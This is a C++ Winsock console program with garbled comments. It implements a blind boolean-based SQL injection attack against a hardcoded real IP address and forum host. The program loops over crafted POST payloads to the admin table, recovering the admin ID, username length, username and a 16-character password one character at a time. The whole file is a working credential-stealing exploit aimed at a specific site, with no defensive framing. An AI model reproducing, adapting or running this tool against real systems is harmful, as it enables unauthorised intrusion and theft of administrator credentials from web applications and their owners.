// sqlinject.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include "http.h"

SOCKET sClient;
//���ص�������ҳ�滹�Ǵ���ҳ��
BOOL RetCmp(char *revData,int ret)
{
	//ҳ�淵����ȷʱ����ֵ��ض��ַ���
    char *tocmp="http://www.nohack.cn/";
	char *Data;
	for(int i=0;i<ret;i++)
	{
		//ָ�����εݼ�
		Data=(char*)&revData[i];
		//���ض��ַ����Ƚ�
		if(strncmp(Data,tocmp,strlen(tocmp))==0)
			return TRUE;
	}
	return FALSE;
}

//�������ݣ�ͬʱ����RetCmp�����жϷ���ҳ�����
BOOL SendData(char *data)
{
	int ret;
	char revData[1024];
	//��������
	send(sClient,data,strlen(data),0);
	//��������
	ret=recv(sClient,revData,1024,0);
	if(ret>0)
	{
		//�ж�ҳ�淵�����
		if(RetCmp(revData,ret))
		{
			return TRUE;
		}
		return FALSE;
	}
}
int main(int argc, char* argv[])
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//����winsock��
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// �����׽���
    sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sClient == INVALID_SOCKET)
	{
		printf("socket error\n");
		return 0;
	}	
	// ��sockaddr_in�ṹ��װ��������˵�ַ��Ϣ
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(80);
	servAddr.sin_addr.S_un.S_addr =inet_addr("61.191.55.102");
	//���ӷ�������
	if(connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr))==SOCKET_ERROR)
	{
		printf("connect error\n");
		closesocket(sClient);
		return 0;
	}
	int ret;
	char revData[1024];
	char packet[1024];
	char *url="/bbs/Databackup/sql/index.asp";
	char *host="bukecn.com";
	//�滻�ո���
	char k[10]="%20";
	//���ע�����
	char data[512];
	int i=1;
	int id=1;
	int j;
	int asc;
	char out[2]={0};
	printf("���ڲ½��û�ID........\n");
	printf("�û�ID��");
	while(1)
	{
		//����½���С���û�ID��ע�����
		wsprintf(data,"id=1%sand%s1=(select%scount(*)%sfrom%sadmin%swhere%sid=%d)",
			k,k,k,k,k,k,k,id);
		//����Post��
		HttpPostPacket(packet,url,host,data);
		//�������ݲ����ж�ҳ�淵�����
		if(SendData(packet))
		{
			printf("%d\n",id);
			break;
		}
		id=id+1;
	}
	printf("���ڲ½��û�������........\n");
	while(1)
	{
		//����Ʋ½��û������ȵ�sqlע�����
		wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom"
			"%s[admin]%swhere%sid=%d%sand%slen(admin)=%d)",
			k,k,k,k,k,k,k,id,k,k,i);
        //����Post��
		HttpPostPacket(packet,url,host,data);
		//�������ݲ����ж�ҳ�淵�����
		if(SendData(packet))
		{
			printf("�û������ȣ�%d\n",i);
			break;
		}
		i=i+1;
	}
	printf("���ڲ½��û���.........\n");
	printf("�û�����");
	for (j=0;j<i;j++)
	{
		asc=97;
		while(1)
		{
			//�½��û�����sql���
			wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s[admin]%s"
				"where%sasc(mid(cstr(admin),%d,1))=%d%sand%sid=%d)",
				k,k,k,k,k,k,k,j+1,asc,k,k,id);
			HttpPostPacket(packet,url,host,data);
			if(SendData(packet))
			{
				out[0]=asc;
				printf("%s",out);
				break;
			}
			asc=asc+1;
		}
	}
	printf("\n���ڲ½�����.........\n");
	printf("���룺\n");
	for (i=0;i<16;i++)
	{
		//�ж�ÿһλ�����asc��ֵ�ķ�Χ��sqlע�����
		wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s[admin]%swhere%s"
			"asc(mid(cstr(password),%d,1))%sbetween%s48%sand%s57%sand%sid=%d)",
			k,k,k,k,k,k,k,i+1,k,k,k,k,k,k,id);
		HttpPostPacket(packet,url,host,data);
		if(SendData(packet))
		{
			asc=48;
			while(1)
			{
				//�½������sql���
				wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s"
					"[admin]%swhere%sasc(mid(cstr(password),%d,1))=%d%sand%sid=%d)",
					k,k,k,k,k,k,k,i+1,asc,k,k,id);
				HttpPostPacket(packet,url,host,data);
				if(SendData(packet))
				{
					out[0]=asc;
					printf("%s",out);
					break;
				}
				asc=asc+1;
			}
		}
		else
		{
			asc=97;
			while(1)
			{
				//�½������sql���
				wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s"
					"[admin]%swhere%sasc(mid(cstr(password),%d,1))=%d%sand%sid=%d)",
					k,k,k,k,k,k,k,i+1,asc,k,k,id);
				HttpPostPacket(packet,url,host,data);
				if(SendData(packet))
				{
					out[0]=asc;
					printf("%s",out);
					break;
				}
				asc=asc+1;
			}
		}
	}
	printf("\n�½����\n");
	closesocket(sClient);
	WSACleanup();
	getchar();
	return 0;
}